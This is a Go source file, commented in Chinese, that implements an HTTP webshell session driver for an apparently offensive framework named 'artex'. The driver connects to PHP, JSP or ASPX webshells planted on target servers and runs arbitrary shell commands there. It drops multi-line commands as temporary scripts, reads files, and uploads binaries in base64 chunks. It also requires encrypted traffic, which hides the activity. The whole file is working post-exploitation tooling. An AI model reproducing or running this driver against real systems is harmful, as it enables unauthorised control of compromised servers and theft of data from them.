// httpshell.go 是 HTTP webshell 会话驱动（v0.6.5）：把立足点 Session 接口
// 落到本地 webshell.Client（PHP/JSP/ASPX 脚本载体）上。
//
// 加密纪律：
//   - Encoder 必须是 aes/xor（或带 Password 时默认 aes）；
//   - encoder=raw 或无 Password 时拒绝建会话，除非调用方显式 AllowPlaintext；
//   - 加密失败绝不静默走明文——建会话即报错，调用方必须明说降级。
//
// 哨兵同步：随机 marker 包裹命令输出，防回显污染/粘连；marker 缺失即报错，
// 不把不可信输出当成功返回。复杂（多行）命令走 base64 落盘 + sh 执行。
package session

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"strings"
	"time"

	"github.com/Autumn-27/artex/webshell"
)

// HTTPShellConfig 是 HTTP webshell 会话的连接参数（来自 sessions.secret
// 解密后的 JSON：password/encoder/script_type/headers/proxy 等）。
type HTTPShellConfig struct {
	URL            string            `json:"url"`
	ScriptType     string            `json:"script_type"` // php/jsp/aspx
	Password       string            `json:"password"`    // 加密口令（aes/xor 的 key）
	Encoder        string            `json:"encoder"`     // aes/xor/raw（空=默认 aes，需 Password）
	Timeout        time.Duration     `json:"timeout"`
	AllowPlaintext bool              `json:"allow_plaintext"` // 显式允许明文（raw），默认 false
	ExtraHeaders   map[string]string `json:"headers,omitempty"`
	Proxy          string            `json:"proxy,omitempty"`
}

// HTTPShell 是 Session 接口的 HTTP webshell 实现。
type HTTPShell struct {
	id     int64
	kind   string
	cfg    HTTPShellConfig
	script string // webshell.Client 用的 script type：php/jsp/aspx
}

// NewHTTPShell 构造 HTTP webshell 会话驱动。加密校验失败直接报错，
// 绝不静默建一个明文会话。
func NewHTTPShell(id int64, kind string, cfg HTTPShellConfig) (*HTTPShell, error) {
	if strings.TrimSpace(cfg.URL) == "" {
		return nil, opError("probe", "webshell URL 为空")
	}
	script := cfg.ScriptType
	if script == "" {
		switch kind {
		case "http_php":
			script = "php"
		case "http_jsp":
			script = "jsp"
		case "http_aspx":
			script = "aspx"
		default:
			return nil, opError("probe", "未知会话类型 %q", kind)
		}
	}
	enc := strings.ToLower(strings.TrimSpace(cfg.Encoder))
	switch enc {
	case "aes", "xor":
		if cfg.Password == "" {
			return nil, opError("probe", "编码器 %s 要求配 password（加密口令），未配拒绝建会话", enc)
		}
	case "raw", "":
		if !cfg.AllowPlaintext {
			return nil, opError("probe", "webshell 未配加密（encoder=%q 且无 password）：拒绝明文建会话；如确需明文，须显式 allow_plaintext=true", enc)
		}
		if enc == "" {
			enc = "raw"
		}
	default:
		return nil, opError("probe", "未知编码器 %q（支持 aes/xor/raw）", enc)
	}
	cfg.Encoder = enc
	return &HTTPShell{id: id, kind: kind, cfg: cfg, script: script}, nil
}

func (h *HTTPShell) ID() int64    { return h.id }
func (h *HTTPShell) Kind() string { return h.kind }

// client 按当前配置新建一个 webshell.Client（Client 是一次性通信客户端）。
func (h *HTTPShell) client(ctx context.Context) *webshell.Client {
	timeout := h.cfg.Timeout
	if timeout <= 0 {
		timeout = 30 * time.Second
	}
	if dl, ok := ctx.Deadline(); ok {
		if remain := time.Until(dl); remain > 0 && remain < timeout {
			timeout = remain
		}
	}
	return &webshell.Client{
		URL: h.cfg.URL, Password: h.cfg.Password, Encoder: h.cfg.Encoder,
		ScriptType: h.script, Timeout: timeout,
		ExtraHeaders: h.cfg.ExtraHeaders, Proxy: h.cfg.Proxy,
	}
}

// Test 做连通性探测（webshell test 往返）。
func (h *HTTPShell) Test(ctx context.Context) error {
	res, err := h.client(ctx).Test()
	if err != nil {
		return opError("test", "连通性探测失败: %v", err)
	}
	if !res.OK {
		return opError("test", "webshell 探针未通过: %s", res.Error)
	}
	return nil
}

func newMarker() string {
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	return "artex_" + hex.EncodeToString(b)
}

// execRaw 直接发一条命令（不包哨兵，内部用）；返回原始输出。
func (h *HTTPShell) execRaw(ctx context.Context, cmd string) (string, error) {
	res, err := h.client(ctx).ExecCmd(cmd)
	if err != nil {
		return "", opError("exec", "请求失败: %v", err)
	}
	if !res.OK {
		return "", opError("exec", "目标执行失败: %s", res.Error)
	}
	return res.Output, nil
}

// Exec 在目标侧执行一条命令。单行命令直接执行并用哨兵截取输出；
// 多行/复杂命令先 base64 落盘再 sh 执行（引号规避），临时文件用完清理。
func (h *HTTPShell) Exec(ctx context.Context, cmd string, timeout time.Duration) (string, string, error) {
	if timeout > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, timeout)
		defer cancel()
	}
	marker := newMarker()
	if strings.Contains(cmd, "\n") {
		tmp := tmpPrefixFrom(ctx) + "exec_" + marker + ".sh"
		if err := h.WriteFile(ctx, tmp, []byte(cmd)); err != nil {
			return "", "", opError("exec", "复杂命令落盘失败: %v", err)
		}
		wrapped := fmt.Sprintf("sh %s 2>&1; rc=$?; rm -f %s; exit $rc", tmp, tmp)
		out, err := h.execRaw(ctx, wrapped)
		if err != nil {
			return "", "", err
		}
		return out, "", nil
	}
	wrapped := fmt.Sprintf("echo %s_BEGIN; %s 2>&1; echo %s_END", marker, cmd, marker)
	out, err := h.execRaw(ctx, wrapped)
	if err != nil {
		return "", "", err
	}
	begin := strings.Index(out, marker+"_BEGIN")
	end := strings.LastIndex(out, marker+"_END")
	if begin < 0 || end < 0 || end <= begin {
		return "", "", opError("exec", "哨兵缺失（输出可能被拦截/截断），拒绝把不可信输出当成功返回；原始输出前 200 字节：%q", truncate(out, 200))
	}
	inner := out[begin+len(marker)+len("_BEGIN") : end]
	return strings.Trim(inner, "\r\n"), "", nil
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

// ReadFile 读目标侧文件。
func (h *HTTPShell) ReadFile(ctx context.Context, path string) ([]byte, error) {
	res, err := h.client(ctx).ReadFile(path)
	if err != nil {
		return nil, opError("read", "读文件失败: %v", err)
	}
	if !res.OK {
		return nil, opError("read", "目标读文件失败: %s", res.Error)
	}
	if len(res.Data) > 0 {
		return res.Data, nil
	}
	return []byte(res.Output), nil
}

const (
	// writeChunk 是 WriteFile 单次投递上限（base64 后约 270KB，避开单次请求过大）。
	writeChunk = 200 << 10
)

// WriteFile 写目标侧文件（二进制安全；大文件分块 append）。
func (h *HTTPShell) WriteFile(ctx context.Context, path string, data []byte) error {
	if len(data) <= writeChunk {
		_, err := h.client(ctx).WriteFile(path, "", base64.StdEncoding.EncodeToString(data))
		if err != nil {
			return opError("write", "写文件失败: %v", err)
		}
		return nil
	}
	// 大文件：分块写临时 part，再 cat 合并（每块经 WriteFile 的 base64 通道落盘为原始字节，shell 侧 cat 追加）。
	marker := newMarker()
	part := tmpPrefixFrom(ctx) + "part_" + marker
	for i := 0; i < len(data); i += writeChunk {
		end := i + writeChunk
		if end > len(data) {
			end = len(data)
		}
		chunk := base64.StdEncoding.EncodeToString(data[i:end])
		if _, err := h.client(ctx).WriteFile(part, "", chunk); err != nil {
			return opError("write", "写文件分块失败（块 %d）: %v", i/writeChunk, err)
		}
		appendCmd := fmt.Sprintf("cat %s >> %s; rm -f %s", part, path, part)
		if _, err := h.execRaw(ctx, appendCmd); err != nil {
			return opError("write", "分块合并失败（块 %d）: %v", i/writeChunk, err)
		}
	}
	return nil
}

// Close 释放资源（HTTP 会话无资源）。
func (h *HTTPShell) Close(ctx context.Context) error { return nil }
